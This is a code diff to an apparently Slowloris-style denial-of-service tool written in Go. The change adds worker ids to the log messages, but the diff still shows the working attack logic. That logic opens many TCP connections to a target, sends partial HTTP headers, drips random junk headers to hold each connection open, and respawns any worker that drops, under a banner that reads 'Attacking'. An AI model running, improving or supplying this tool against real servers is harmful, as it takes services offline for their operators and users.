@@ -29,19 +29,19 @@ func usage() {
 	flag.PrintDefaults()
 }
 
-func runSlave(target string) {
+func runSlave(target string, id int) {
 	defer wg.Done()
 
 	conn, err := net.DialTimeout("tcp", target+":"+*port, timeout*time.Second)
 	if err != nil {
-		fmt.Println("Error creating slave")
+		fmt.Printf("[%v] Error creating slave\n", id)
 		return
 	}
 	// send headers
 	for _, header := range headers {
 		_, err = fmt.Fprint(conn, header+crlf)
 		if err != nil {
-			fmt.Println("Error sending headers")
+			fmt.Printf("[%v] Error sending headers\n", id)
 			return
 		}
 	}
@@ -49,8 +49,8 @@ func runSlave(target string) {
 	for {
 		_, err = fmt.Fprintf(conn, "X-a: %v%s", rand.Intn(5000), crlf)
 		if err != nil {
-			fmt.Println("Can't send data, respawning")
-			defer runSlave(target)
+			fmt.Printf("[%v] Can't send data, respawning\n", id)
+			defer runSlave(target, id)
 			return
 		}
 		time.Sleep(sleepDuration * time.Second)
@@ -70,7 +70,7 @@ func main() {
 	fmt.Printf("Attacking %s with %v slaves...\n", target, *count)
 	for i := 0; i < *count; i++ {
 		wg.Add(1)
-		go runSlave(target)
+		go runSlave(target, i)
 	}
 
 	wg.Wait()
